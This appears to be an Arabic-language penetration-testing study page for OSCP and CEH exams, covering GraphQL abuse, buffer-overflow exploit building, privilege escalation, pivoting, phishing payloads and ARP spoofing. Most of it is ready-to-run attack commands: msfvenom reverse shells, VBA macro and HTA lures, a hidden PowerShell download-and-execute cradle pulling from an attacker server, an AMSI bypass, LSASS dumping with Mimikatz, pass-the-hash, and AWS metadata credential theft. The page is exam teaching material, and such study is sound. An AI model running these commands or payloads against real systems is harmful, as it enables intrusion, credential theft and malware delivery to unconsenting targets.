⚡ Mistakes vs Best Practices

❌ Common Mistakes
  • Running Nuclei first without recon
  • Ignoring JavaScript files completely
  • Only testing the main domain
  • Skipping manual testing for automation
  • Not reading the program scope carefully

  • Always start with subdomain enumeration
  • Analyze every JS file for secrets & endpoints
  • Test ALL subdomains, not just main
  • Manual testing > Automated scanning
  • Read the scope document at least 3 times

🧩 Edge Cases & FAQ

🤔 What if the scope is too large?▼
Focus on recently acquired assets and new features. Check acquisition history on Crunchbase. New subdomains and recently deployed services are most likely to have bugs.
🛡️ What if all subdomains are behind WAF?▼
Try origin IP discovery using Shodan, Censys, or SecurityTrails. Check historical DNS records on DNS Dumpster. Some WAFs can be bypassed with HTTP/2 downgrades or chunked encoding.
🔍 What if no vulnerabilities are found?▼
Switch to API testing — many programs have undocumented APIs. Check mobile app endpoints using MobSF. Try business logic bugs (race conditions, coupon abuse, privilege escalation).
⏰ When should I abandon a target?▼
After 8+ hours with zero interesting findings, move on. Keep notes for later. Sometimes coming back after a few weeks with fresh eyes reveals what you missed.
🚫 How to handle rate limiting?▼
Add delays between requests (--rate-limit flags). Rotate source IPs if possible. Switch to manual testing in Burp. Some targets accept higher rates during off-peak hours.

Step 1 — Schema Discovery & Endpoints

أولى خطوات فحص الـ GraphQL هي تحديد الرابط البرمجي له. أشهر المسارات الشائعة:

  • ✔ /graphql
  • ✔ /api/graphql
  • ✔ /v1/graphql
  • ✔ /query

Step 2 — Introspection Query Injection

إذا كانت الـ Introspection مفعلة، يمكنك سحب كامل المخطط. أرسل حمولة الاستعلام التالية:

{"query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { name kind fields { name } } } }"}

ماذا لو كانت مغلقة؟ نستخدم أداة Clairvoyance لتخمين المخطط يدوياً:

clairvoyance https://target.com/graphql -o schema.json

Step 3 — Query Abuse (Nested Queries)

استغلال العلاقات المتداخلة لطلب بيانات لا حصر لها، مما يتسبب في شلل الخادم:

query { author { posts { author { posts { author { name } } } } } }

Step 4 — GraphQL IDOR

الاستعلام المباشر عن حسابات أخرى عبر التلاعب بالمعرفات في الـ resolvers:

query { userProfile(id: 1002) { username email creditCardNumber } }

Step 5 — Batch Attacks (Rate Limit Bypass)

دمج مئات الطلبات داخل مصفوفة JSON لإرسالها دفعة واحدة وتجاوز القيود الزمنية لطلب البينات أو تخمين كلمات المرور:

[ {"query": "mutation { login(username:\"admin\", password:\"1111\") { token } }"}, {"query": "mutation { login(username:\"admin\", password:\"2222\") { token } }"}, {"query": "mutation { login(username:\"admin\", password:\"3333\") { token } }"} ]

فيض الذاكرة وتطوير الاستغلال (Buffer Overflow)

يُعد الـ Buffer Overflow من أهم الأساسيات في امتحان OSCP (يمثل 25 نقطة مضمونة). يتطلب فهم كيفية التلاعب بذاكرة البرنامج للتحكم في مسار التنفيذ (EIP) وحقن الكود الخبيث.

المنهجية المكونة من 8 خطوات أساسية

يجب تنفيذ هذه الخطوات بالترتيب الدقيق باستخدام Immunity Debugger وسكربت Mona.py لضمان نجاح الاستغلال أثناء الامتحان.

1. عملية الـ Fuzzing (التشويش)

الهدف هنا هو إرسال بيانات (حرف A) بشكل متزايد للتطبيق حتى ينهار (Crash). هذا يساعدنا في معرفة الحجم التقريبي للبيانات اللازمة لكسر البرنامج.

python fuzzer.py
2. إيجاد نقطة الانهيار (Find Offset)

بعد معرفة عدد البايتات التقريبي، نقوم بتوليد سلسلة حروف غير مكررة (Cyclic Pattern) ونرسلها للتطبيق. عندما ينهار التطبيق، ننظر إلى قيمة مسجل الـ EIP (مؤشر التعليمات) لمعرفة الأحرف التي كتبناها فوقه بدقة.

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000 !mona findmsp -distance 3000
3. التحكم في الـ EIP

للتأكد من أننا نتحكم بالكامل في الـ EIP، نرسل حرف "A" بمقدار الـ Offset، يليه 4 أحرف "B" (والتي تمثل B بالهيكس). إذا أصبح الـ EIP يساوي 42424242، فقد نجحنا في التحكم.

payload = b"A" * offset + b"B" * 4 + b"C" * 400
4. اكتشاف الحروف السيئة (Bad Characters)

بعض الأحرف (مثل ) تقوم بقطع الاتصال أو كسر الـ Payload. نقوم بإرسال كل الأحرف الممكنة ونقارن ما تم إرساله بما هو موجود في الذاكرة باستخدام Mona لاكتشاف واستبعاد هذه الأحرف.

!mona bytearray -b "\x00" !mona compare -f C:\mona\bytearray.bin -a [ESP_ADDRESS]
5. البحث عن تعليمة (JMP ESP)

بما أن الـ Payload الخاص بنا سيكون موجوداً في مسجل הـ ESP، نحن بحاجة إلى العثور على تعليمة JMP ESP في إحدى ملفات الـ DLL الخاصة بالبرنامج (بشرط ألا تكون محمية بـ ASLR أو DEP) للقفز إلى الكود الخاص بنا.

!mona jmp -r esp -cpb "\x00\x0a"
6. توليد الشيل كود (Generate Shellcode)

باستخدام msfvenom، نقوم بتوليد كود خبيث (Reverse Shell) مع التأكد من استبعاد الحروف السيئة التي وجدناها في الخطوة الرابعة باستخدام المتغير `-b`.

msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 EXITFUNC=thread -b "\x00\x0a" -f c
7. بناء الاستغلال النهائي (Exploit)

نقوم بتجميع كل القطع: نرسل الـ A's (الـ Offset)، ثم عنوان الـ JMP ESP، ثم مساحة فارغة (NOP Sled ) لإعطاء المعالج مساحة للقفز بأمان، ثم أخيراً الشيل كود.

payload = b"A" * offset + jmp_esp + b"\x90" * 16 + shellcode

تصعيد الصلاحيات في أنظمة لينكس (Linux PrivEsc)

بمجرد حصولك على صلاحية مستخدم عادي (Low-Privilege Shell)، تبدأ رحلة البحث عن الثغرات المحلية والأخطاء في الإعدادات للوصول إلى صلاحيات الجذر (Root).

مسارات اختراق لينكس الأساسية

1. أخطاء إعدادات Sudo

أول خطوة دائماً هي التحقق مما إذا كان المستخدم الحالي يمكنه تشغيل أي أوامر بصلاحيات الـ root دون الحاجة لكلمة مرور. إذا وجدت أمراً مسموحاً، ابحث عنه في موقع GTFOBins لمعرفة كيفية استغلاله للحصول على شيل.

sudo -l

نصيحة الامتحان: تأكد أيضاً من التحقق من ثغرة CVE-2019-14287 عن طريق تجربة sudo -u#-1 command.

2. ملفات الـ SUID / SGID

الـ SUID هو تصريح خاص يسمح للملف بالعمل بصلاحيات مالكه (والذي غالباً ما يكون الـ Root). نبحث عن البرامج التي تمتلك هذا التصريح بشكل غير افتراضي (مثل vim، find، bash) واستغلالها.

find / -perm -u=s -type f 2>/dev/null find / -perm -g=s -type f 2>/dev/null
3. المهام المجدولة (Cron Jobs)

يقرأ نظام التشغيل ملفات الـ Cron لتنفيذ المهام آلياً. إذا وجدنا سكربت يعمل كـ root ولكننا نملك صلاحية التعديل عليه (Write permissions)، يمكننا إضافة أمر Reverse Shell بداخله ليتم تنفيذه في الوقت المحدد.

cat /etc/crontab ls -la /etc/cron.*
4. الصلاحيات الجزئية (Capabilities)

تُستخدم الـ Capabilities لإعطاء البرامج صلاحيات معينة للـ Root دون إعطائها الصلاحية الكاملة (SUID). إذا امتلك برنامج مثل python أو perl أو tar صلاحية مثل `cap_setuid+ep`، يمكن استغلاله للترقية.

getcap -r / 2>/dev/null

تصعيد الصلاحيات في ويندوز (Windows PrivEsc)

الترقية من مستخدم عادي (أو Service Account) إلى أعلى مستوى من الصلاحيات (NT AUTHORITY\SYSTEM) عبر استغلال البنية التحتية لويندوز.

متجهات الهجوم في ويندوز

1. انتحال الصلاحيات (Token Impersonation)

عند اختراق سيرفر ويب (IIS) أو قاعدة بيانات (MSSQL)، غالباً ما ستحصل على مستخدم لديه صلاحية `SeImpersonatePrivilege`. هذه الصلاحية تتيح لك إجبار خدمة ذات صلاحيات عليا (SYSTEM) على المصادقة معك، ومن ثم انتحال الـ Token الخاص بها باستخدام أدوات مثل PrintSpoofer أو JuicyPotato.

whoami /priv # If SeImpersonate is enabled: PrintSpoofer64.exe -i -c cmd JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t *
2. مسارات الخدمات غير المحمية (Unquoted Service Paths)

عندما يتم تثبيت خدمة في ويندوز في مسار يحتوي على مسافات (مثل `C:\Program Files\App`) ولم يقم المبرمج بوضع المسار بين علامتي تنصيص `""`، سيحاول ويندوز تنفيذ `C:\Program.exe` أولاً. إذا كان لدينا صلاحية الكتابة في الـ `C:\`، يمكننا وضع ملف خبيث باسم `Program.exe` ليتم تنفيذه كـ SYSTEM.

wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\" | findstr /i /v "\"\"\""
3. برامج بدء التشغيل (Registry AutoRuns)

هناك مفاتيح في الريجستري مسؤولة عن تشغيل البرامج تلقائياً عند تسجيل الدخول. إذا وجدنا مساراً لبرنامج يعمل تلقائياً، واكتشفنا أننا نملك صلاحيات تعديل أو استبدال الملف التنفيذي لهذا البرنامج، يمكننا زرع باك دور ليتم تنفيذه عندما يدخل الـ Administrator.

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
4. البحث عن كلمات المرور المخزنة (Stored Credentials)

كثيراً ما يترك مدراء الأنظمة كلمات المرور كنصوص واضحة (Cleartext) في ملفات الإعدادات (XML, INI, TXT) أو يتم حفظها في الـ Credential Manager الخاص بويندوز. يجب دائماً فحص هذه الأماكن.

findstr /si password *.txt *.xml *.ini cmdkey /list

الفحص المتقدم للشبكات (Advanced Enumeration)

النجاح في OSCP يعتمد بنسبة 80% على جودة الفحص وجمع المعلومات. تفويت بورت مفتوح واحد قد يعني الفشل في اختراق الآلة.

منهجية الفحص ذات الخطوتين (The Two-Step Scan)

الخطوة الأولى: المسح السريع لكل المنافذ (All Ports TCP)

الفحص الافتراضي لـ Nmap يفحص فقط أهم 1000 بورت. في الامتحان يجب فحص جميع الـ 65535 بورت بشكل سريع جداً للعثور على أي خدمات مخفية، مع تجاهل فحص البينج (`-Pn`).

sudo nmap -p- -Pn --min-rate 1000 -vvv -oG openPorts [TARGET]
الخطوة الثانية: الفحص العميق للمنافذ المفتوحة (Deep Scan)

بعد معرفة المنافذ المفتوحة بدقة من الخطوة الأولى، نقوم بتوجيه Nmap لفحص هذه المنافذ فقط ولكن بشكل عميق جداً لمعرفة نوع الخدمة (`-sV`) وتشغيل السكربتات الافتراضية للبحث عن ثغرات بديهية (`-sC`).

nmap -p [PORTS] -sC -sV -O -oA full_scan [TARGET]
لا تنسى منافذ الـ UDP! (UDP Scanning)

الكثير من الطلاب يرسبون لتجاهلهم فحص بروتوكول UDP. خدمات مثل SNMP (161) و TFTP (69) غالباً ما تخبئ متجهات هجوم قاتلة لا تظهر في فحص الـ TCP.

sudo nmap -sU -p 53,69,161,137,139 --top-ports 20 [TARGET]
الفحص المخصص لخدمات SMB & SNMP

عند إيجاد بورت 445 (SMB)، استخدم أدوات متخصصة للحصول على قائمة المستخدمين أو الملفات المشتركة. للـ SNMP (161) استخدم snmpwalk لسحب بيانات النظام بالكامل.

smbclient -L //[TARGET] -N enum4linux -a [TARGET] snmpwalk -c public -v1 [TARGET]

طرق نقل الملفات (File Transfers)

أثناء الامتحان ستحتاج باستمرار إلى نقل أدوات مثل LinPEAS أو WinPEAS أو استغلالات (Exploits) من جهاز الكالي الخاص بك إلى الآلة المخترقة. يجب إتقان هذه الطرق بشدة.

تحضير السيرفر في كالي (Attacker Server)

الخطوة الأولى دائماً هي فتح سيرفر لمشاركة الملفات. الـ HTTP هو الأسهل، لكن بروتوكول SMB لا غنى عنه عند اختراق آلات ويندوز لأنه يسمح بتشغيل الملفات مباشرة دون تحميلها على القرص.

python3 -m http.server 80 # SMB Server for Windows targets sudo impacket-smbserver share `pwd` -smb2support
سحب الملفات إلى أنظمة لينكس

تحميل الملفات في لينكس يتم عادة عن طريق `wget` أو `curl`. في حال عدم توفرهما، يمكن استخدام الـ Netcat لإرسال الملف عبر اتصال الشبكة.

wget http://[KALI]/linpeas.sh -O /tmp/linpeas.sh curl http://[KALI]/linpeas.sh -o /tmp/linpeas.sh nc -nv [KALI] 4444 > file.txt
سحب الملفات إلى أنظمة ويندوز

أداة `Certutil` مدمجة في نظام ويندوز لتنزيل الشهادات ولكنها تستخدم كثيراً من الهاكرز لتحميل الملفات لكونها موثوقة. أيضاً يمكن استخدام PowerShell أو نسخ الملف مباشرة من الـ SMB Share الذي قمنا بإنشائه على الكالي.

certutil.exe -urlcache -split -f http://[KALI]/winpeas.exe C:\Temp\winpeas.exe powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://[KALI]/file', 'C:\Temp\file')" copy \\[KALI]\share\winpeas.exe C:\Temp\winpeas.exe

هجمات التخمين وكسر التشفير (Password Attacks)

التخمين المباشر (Brute-force) على الخدمات، وكسر الهاش (Hash Cracking) عندما نحصل على ملفات تحتوي على كلمات مرور مشفرة.

التخمين الشبكي باستخدام Hydra

تُستخدم Hydra لتخمين كلمات المرور على الخدمات النشطة (مثل SSH, FTP, RDP, Web Logins). تعتمد قوتها على استخدام قائمة كلمات ممتازة (مثل rockyou.txt).

hydra -l admin -P rockyou.txt ssh://[TARGET] hydra -L users.txt -p Password123 rdp://[TARGET]
كسر الهاش (Offline Cracking) باستخدام Hashcat

عندما نسحب ملف الـ SAM من ويندوز أو ملف /etc/shadow من لينكس، نستخدم قوى كرت الشاشة (GPU) لكسر التشفير. يجب معرفة نوع الـ Hash لتحديد الـ Module (مثلاً 1000 لـ NTLM).

hashcat -m 1000 hashes.txt rockyou.txt # NTLM hashcat -m 1800 hashes.txt rockyou.txt # SHA-512 (Linux shadow) hashcat -m 5600 hashes.txt rockyou.txt # NetNTLMv2
تجاوز التشفير (Pass The Hash)

في بيئات ويندوز (Active Directory)، إذا استطعنا سحب الـ NTLM Hash لمستخدم، لسنا بحاجة لكسره إطلاقاً! يمكننا استخدامه مباشرة لتسجيل الدخول وتنفيذ الأوامر باستخدام بروتوكول SMB.

impacket-psexec Administrator@10.10.10.10 -hashes aad3b435b51404eeaad3b435b51404ee:NTHASH

العبور والأنفاق الشبكية (Pivoting & Tunneling)

أحد أصعب أجزاء امتحان الـ OSCP والأكثر أهمية لاختراق بيئة الـ Active Directory. العبور (Pivoting) يعني استخدام آلة مخترقة كمحطة وسيطة للوصول لشبكات داخلية معزولة لا يمكن الوصول إليها من الخارج.

بناء نفق عكسي باستخدام Chisel (SOCKS5 Proxy)

تعتبر أداة Chisel من أهم وأقوى الأدوات في الامتحان لبناء الـ Tunnels لكونها تعمل فوق بروتوكول HTTP. الفكرة هي إنشاء سيرفر على جهاز الكالي، وتشغيل أداة العميل على الجهاز المخترق ليربط شبكته الداخلية بآلة الكالي الخاصة بنا على بورت 1080.

# On Kali (Server) chisel server -p 8000 --reverse # On Target (Client) chisel client [KALI_IP]:8000 R:socks
توجيه الأدوات عبر النفق (Proxychains)

بعد أن أنشأنا النفق عبر Chisel، أصبح البورت 1080 على كالي متصلاً بالشبكة الداخلية! لكي نجعل أدوات مثل Nmap أو Impacket تستخدم هذا النفق، نقوم بتعديل ملف `/etc/proxychains.conf` ليحتوي على `socks5 127.0.0.1 1080` في آخره، ثم نسبق أي أمر بكلمة proxychains.

proxychains nmap -sT -Pn -p 445 [INTERNAL_IP] proxychains impacket-smbexec user@172.16.0.5
التحويل المحلي للمنافذ (SSH Local Port Forwarding)

إذا كان لديك بيانات دخول لـ SSH على جهاز مخترق، يمكنك سحب بورت داخلي (مثل سيرفر ويب داخلي يعمل على بورت 80) إلى جهازك الشخصي لتتمكن من فتحه في متصفحك.

ssh -L 8080:127.0.0.1:80 user@[TARGET]

تكتيكات الميتاسبلويت (Metasploit Framework)

كيفية تسخير الميتاسبلويت بذكاء داخل قيود الامتحان الصارمة لتوليد الـ Payloads وإدارة الجلسات بشكل احترافي.

استخدامات MSFvenom (غير محدودة)

يُسمح باستخدام MSFvenom لتوليد أي عدد من الحمولات (Payloads) لتجاوز الحماية أو تنفيذ أوامر عن بعد. سواء كانت ملفات تنفيذية (EXE/ELF) أو كود برمجي (Python/C).

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o rev.exe msfvenom -p linux/x86/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f elf -o rev.elf
أساسيات جلسات Meterpreter

إذا اخترت هدفك لاستخدام الـ Meterpreter عليه، يجب أن تستغل هذه الجلسة القوية لأقصى حد. استخدمها لرفع وتحميل الملفات بسهولة تامة، سحب كلمات المرور (hashdump)، وفتح طرفية مباشرة للنظام (shell).

getuid sysinfo hashdump upload /root/linpeas.sh /tmp/linpeas.sh download C:\Users\Admin\proof.txt /root/proof.txt shell
توجيه الشبكة عبر الميتاسبلويت (MSF Pivoting)

من أقوى ميزات המييتاسبلويت هي وحدة الـ Autoroute. عندما تحصل على جلسة على جهاز يتصل بشبكة داخلية أخرى، يمكنك توجيه كل هجمات الميتاسبلويت القادمة لتمر عبر هذا الجهاز المخترق.

run autoroute -s 172.16.5.0/24 background use auxiliary/server/socks_proxy run -j

هجمات جانب العميل (Client-Side Attacks)

أحياناً يكون السيرفر محصناً ولا يحتوي على ثغرات. الحل؟ استهداف المستخدمين (الموظفين) عبر الهندسة الاجتماعية لفتح ملفات خبيثة تعطينا اتصالاً بنظامهم.

1. ماكرو مايكروسوفت أوفيس (Malicious VBA Macros)

يتم تضمين كود برمجي بلغة VBA داخل ملفات Word أو Excel. بمجرد أن يفتح المستخدم الملف ويضغط على (Enable Content)، يتم تنفيذ الكود الذي يحمل الـ Payload ويتصل بجهازنا.

msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f vba # Copy output into Word Developer -> Visual Basic -> Document_Open()
2. تطبيقات الـ HTA (HTML Applications)

ملفات الـ HTA هي صفحات إنترنت تُفتح عبر متصفح Internet Explorer ولكنها تُنفذ بصلاحيات النظام (بدون الـ Sandbox) مما يسمح بتنفيذ سكربتات VBScript خطيرة. تُستخدم كثيراً كملفات مرفقة خادعة.

msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f hta-psh -o invoice.hta
3. اختصارات ويندوز الملغمة (.lnk Files)

بدلاً من إرسال ملف تنفيذي مشبوه، نرسل ملف اختصار عادي جداً (.lnk)، ولكننا نغير مساره ليقوم بفتح موجه الأوامر المخفي وتحميل سكربت PowerShell من سيرفرنا وتشغيله بصمت.

powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://[KALI]/rev.ps1')"

منهجية ما بعد الاختراق (Post-Exploitation)

الخطوات الأساسية التي يجب أن تتخذها فور نجاحك في اختراق الآلة لترسيخ تواجدك، جمع الأدلة، وسحب البيانات الحساسة.

1. الوعي الظرفي (Situational Awareness)

أول ما تفعله عند الدخول هو الإجابة على: "أنا من؟، ما هو هذا النظام؟، وما هي الأجهزة المتصلة به؟". استخراج جدول التوجيه (Routing Table) والاتصالات المفتوحة سيكشف لك عن الشبكات الداخلية الأخرى التي ستستهدفها تالياً.

whoami /all ipconfig /all netstat -ano arp -a route print
2. سحب الأدلة الرسمية (Evidence Collection)

بدون الحصول على ملفات الإثبات، لن يعترف OffSec باختراقك للآلة. ابحث فوراً عن ملف الـ (proof.txt) لمدير النظام و الـ (local.txt) للمستخدم العادي، واقرأ محتواهما واصنع لقطة الشاشة المطلوبة لتقريرك.

type C:\Users\[User]\Desktop\local.txt cat /root/proof.txt
3. حصاد كلمات المرور من الذاكرة (Credential Harvesting via LSASS)

إذا امتلكت صلاحية النظام، يمكنك سرقة كلمات مرور جميع المستخدمين الذين قاموا بتسجيل الدخول على الآلة. أفضل طريقة آمنة هي سحب نسخة من ذاكرة الـ LSASS باستخدام Procdump، ثم تحليلها لاحقاً بجهازك بأداة Mimikatz لاستخراج كلمات المرور الواضحة والهاشات.

# Dump LSASS memory procdump.exe -accepteula -ma lsass.exe lsass.dmp # Extract offline with Mimikatz mimikatz # sekurlsa::minidump lsass.dmp mimikatz # sekurlsa::logonpasswords
4. تنظيف مسرح الجريمة (House Cleaning)

أخلاقيات الهاكر المحترف تتطلب منه إعادة النظام كما كان. تذكر دائماً حذف أي استغلالات (Exploits) أو أدوات (مثل linpeas) رفعتها لتجنب لفت انتباه مدراء النظام أو التشويش على من يفحص بعدك.

rm /tmp/linpeas.sh del C:\Temp\winpeas.exe

التخفي وتجاوز الحماية (AV Evasion & AMSI Bypass)

تخطّي تقنيات الحماية مثل Windows Defender والـ AMSI التي تمنع تنفيذ الأكواد والمبرمجات الخبيثة داخل بيئات الويندوز المحدثة.

1. تعمية واجهة فحص البرامج الضارة (AMSI Bypass)

الـ AMSI هو نظام من مايكروسوفت يقوم بفحص أي سكربت يتم تنفيذه في الـ PowerShell قبل أن يُرسل للذاكرة. لتشغيل برامج مثل Mimikatz في الباورشيل، يجب أولاً حقن الذاكرة بأمر يقوم بتعطيل وظيفة الفحص وإجبارها على إرجاع نتيجة "آمن" دائماً.

# Obfuscated AmsiScanBuffer patch (Example) [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
2. حقن الملفات الديناميكي باستخدام (Shellter)

استخدام الـ Payloads الافتراضية الخاصة بـ Metasploit يتم اكتشافها فوراً لكون بصمتها معروفة. برنامج Shellter يقوم بتغيير هذه البصمة (Polymorphism) عن طريق حقن الـ Payload المخفي داخل ملف تنفيذي حقيقي وسليم (مثل Putty.exe) بحيث يتم تجاوز مكافح الفيروسات الساكن (Static Analysis).

sudo apt install shellter shellter # Follow prompts: Select target executable -> Select Payload -> Inject
3. التنفيذ الكلي داخل الذاكرة (In-Memory Execution)

أكبر خطأ يقع فيه الهاكر هو تنزيل ملف الاختراق (exe أو ps1) على القرص الصلب حيث يسهل التقاطه. الأسلوب الاحترافي هو تحميل كود الـ PowerShell من الإنترنت وتنفيذه فوراً داخل الذاكرة العشوائية (RAM) دون كتابة أي شيء على القرص.

IEX (New-Object Net.WebClient).DownloadString('http://[KALI]/Invoke-Mimikatz.ps1')

فحص واختراق بيئة السحابة (Cloud / AWS Enumeration)

تم تحديث شهادة OSCP مؤخراً لتشمل مفاهيم الحوسبة السحابية نظراً لانتشارها. يجب أن تكون مستعداً للتعامل مع خدمات الحوسبة لشركة Amazon (AWS) واستغلال إعداداتها الخاطئة.

1. استغلال ثغرات الـ SSRF لسرقة بيانات الدخول السحابية

عند العثور على ثغرة SSRF في تطبيق ويب مستضاف على خدمة AWS EC2، لا نستخدمها لفحص الشبكة فحسب، بل الأهم هو توجيهها للـ "البيانات الوصفية" (Instance Metadata) على الآيبي السحري الخاص بأمازون (169.254.169.254). من خلاله يمكننا سرقة مفاتيح (Access Keys) تعطينا تحكم كامل في حساب الكلاود.

curl http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]
2. اكتشاف ثغرات تخزين الـ S3 Buckets

تُستخدم الـ S3 لتخزين الملفات. العديد من الشركات تخطئ في إعداداتها فتتركها عامة، مما يتيح لك كسحب بيانات سرية (كود المصدر، بيانات العملاء) أو الأخطر: رفع ملفات خبيثة إلى مساحات التخزين المرتبطة بمواقع حية للتحكم بها.

aws s3 ls s3://[bucket-name] --no-sign-request aws s3 cp localfile.txt s3://[bucket-name]/ --no-sign-request
3. ضبط موجه أوامر AWS (AWS CLI Configuration)

إذا نجحت في سرقة مفاتيح الوصول (Access Key و Secret Key و Session Token)، يجب عليك دمج هذه المفاتيح في سطر الأوامر الخاص بجهاز كالي لكي يبدأ جهازك بالتصرف وكأنه مدير النظام السحابي، لتقوم بمهام الاختراق المتقدمة.

aws configure export AWS_ACCESS_KEY_ID="AKIA..." export AWS_SECRET_ACCESS_KEY="..." export AWS_SESSION_TOKEN="..."

إستراتيجية الامتحان وكتابة التقرير (Exam Strategy)

لا يهم عدد الآلات التي ستخترقها إذا فشلت في توثيقها بشكل سليم. التقرير الاحترافي والإدارة الجيدة للوقت هما مفتاح النجاح في OSCP.

1. التوثيق هو كل شيء (Documentation)

يجب أخذ لقطات شاشة (Screenshots) لكامل الشاشة (وليس فقط للنافذة). لقطة الشاشة الأساسية في أي اختراق يجب أن تحتوي على محتوى ملف الـ (proof.txt أو local.txt) بجانب أمر يظهر الـ IP الخاص بالآلة (ipconfig/ifconfig) في نفس نافذة الطرفية لضمان إثبات الاختراق.

2. قيود Metasploit الصارمة

تذكر القاعدة الذهبية: يسمح لك باستخدام وحدات الاستغلال (Exploits) وجلسات الـ Meterpreter ضد (هدف واحد فقط) في الامتحان بأكمله. إذا فشل الاستغلال، فلن تتمكن من استخدامه على هدف آخر. ومع ذلك، أداة MSFvenom لبناء الشيل كود ووحدات الـ Multi/Handler لتلقي الاتصالات مسموحة بلا حدود.

3. إدارة الوقت وتجنب جحور الأرانب (Rabbit Holes)

إذا قضيت أكثر من ساعتين في محاولة استغلال ثغرة معينة ولم تنجح، توقف فوراً! ارجع لعمل فحص (Enumeration) من جديد. الامتحان مصمم ليضع أمامك مسارات وهمية (Rabbit holes) لتضييع وقتك. القاعدة هي: ابحث -> حاول -> افشل سريعاً -> ابحث مجدداً.

4. حساب النقاط (Active Directory Points)

اختراق مجموعة الـ Active Directory بأكملها يعطيك 40 نقطة (إما أن تأخذها كلها باختراق الـ Domain Controller أو لا تأخذ شيئاً). الآلات المستقلة تعطي 20 نقطة. يُنصح بشدة بالبدء بتدمير بيئة الـ AD أولاً لضمان نجاح كبير مبكراً.

🕵️ CEH Module 8: Sniffing & MITM

الدليل الشامل لاعتراض وتحليل حركة مرور الشبكات السلكية واللاسلكية

🔴 High Risk ⏱ Layer 2/3 Attacks 🔧 Wireshark · Ettercap · Bettercap
📖 ما هو الـ Sniffing؟

هو عملية اعتراض وقراءة حزم البيانات (Packets) التي تمر عبر الشبكة. يشبه الأمر التنصت على مكالمة هاتفية. إذا كانت البيانات غير مشفرة (مثل HTTP, FTP, Telnet)، يمكن للمهاجم سرقة كلمات المرور، رسائل البريد، والملفات بسهولة بالغة.

🎯 الهدف من الـ Sniffing

الهدف الأساسي هو كشف المعلومات الحساسة التي تنتقل عبر الشبكة قبل وصولها للوجهة، أو التلاعب بها (Man-in-the-Middle) لإجبار المستخدمين على تحميل برمجيات خبيثة أو توجيههم لمواقع مزيفة.

الفرق بين Active و Passive Sniffing

├── 📂 Passive Sniffing (التنصت السلبي): يحدث في الشبكات القديمة التي تستخدم Hubs. الـ Hub يقوم ببث (Broadcast) أي بيانات يستقبلها لجميع الأجهزة المتصلة به. المهاجم هنا لا يحتاج لفعل أي شيء سوى تشغيل أداة التقاط (مثل Wireshark) في وضع الـ Promiscuous Mode وجمع البيانات بصمت تام.
└── 📜 Active Sniffing (التنصت النشط): يحدث في الشبكات الحديثة التي تستخدم Switches. الـ Switch ذكي، يمتلك جدول (CAM Table) يربط كل عنوان MAC بمنفذ (Port) محدد، ويرسل البيانات للوجهة فقط. للتنصت هنا، يجب على المهاجم خداع الـ Switch أو الضحية (عبر هجمات مثل ARP Spoofing).

أبرز هجمات الشبكة (Network Attacks) بالتفصيل

1. MAC Flooding

يقوم المهاجم بإرسال آلاف عناوين الـ MAC المزيفة في ثوانٍ معدودة. الـ Switch يمتلك ذاكرة محدودة (CAM Table). عندما تمتلئ هذه الذاكرة، يصاب الـ Switch بالارتباك ويدخل في وضع Fail-Open Mode، ليتحول فعلياً إلى Hub غبي يبث البيانات لجميع المنافذ.

استخدام أداة macof
macof -i eth0 -n 100000

2. ARP Poisoning (Man-in-the-Middle)

بروتوكول ARP مسؤول عن تحويل الـ IP إلى MAC Address. لا يمتلك ARP أي آلية للتحقق من الهوية. يقوم المهاجم بإرسال رسائل ARP مزيفة للضحية يخبره فيها: "أنا الـ Router"، ويرسل رسالة للـ Router يخبره: "أنا الضحية". فتمر كل البيانات عبر جهاز المهاجم أولاً.

arpspoof (تسميم الضحية والراوتر)
# Enable IP Forwarding so internet doesn't drop for the victim
echo 1 > /proc/sys/net/ipv4/ip_forward

# Poison Victim (Tell victim: I am the gateway)
arpspoof -i eth0 -t <Victim_IP> <Gateway_IP>

# Poison Gateway (Tell gateway: I am the victim)
arpspoof -i eth0 -t <Gateway_IP> <Victim_IP>

3. DHCP Starvation & Spoofing

Starvation: يقوم المهاجم بطلب عناوين IP كثيرة جداً بعناوين MAC مزيفة حتى يستنزف الـ DHCP Server، فلا يجد المستخدمون الشرعيون أي IP متاح للاتصال بالشبكة.
Spoofing: بعد إسقاط الخادم الشرعي، يرفع المهاجم Rogue DHCP Server يقوم بتوزيع عناوين IP للضحايا مع تعيين جهازه كـ Default Gateway و DNS Server.

استنزاف DHCP باستخدام Yersinia
yersinia dhcp -attack 1 -interface eth0

أدوات الـ Sniffing المتقدمة

الأداةشرح متعمق
Wireshark المعيار الذهبي لتحليل الحزم (Packet Analysis). يمكنه التقاط وفك تشفير مئات البروتوكولات. ميزة الـ Display Filters فيه قوية جداً (مثال: http.request.method == "POST" لاصطياد كلمات المرور).
Bettercap الإصدار العصري من Ettercap. أداة سطر أوامر قوية جداً لهجمات MITM، تدعم الـ SSL Stripping مدمجاً، يمكنها حقن جافاسكريبت في صفحات الويب، وسحب كلمات المرور تلقائياً من الشبكة.
tcpdump النسخة الأخف من Wireshark وتعمل من الـ Terminal. ممتازة للسيرفرات التي لا تحتوي على واجهة رسومية (GUI). أمر شائع: tcpdump -i eth0 -w capture.pcap لحفظ الحزم وتحليلها لاحقاً.
Cain & Abel أداة قديمة لكنها تدرس في المنهج كلاسيكياً، تعمل على نظام Windows وتتخصص في فك التشفير، التنصت، كسر الهاشات، وتسجيل محادثات الـ VoIP.

تجاوز التشفير (SSL Stripping)

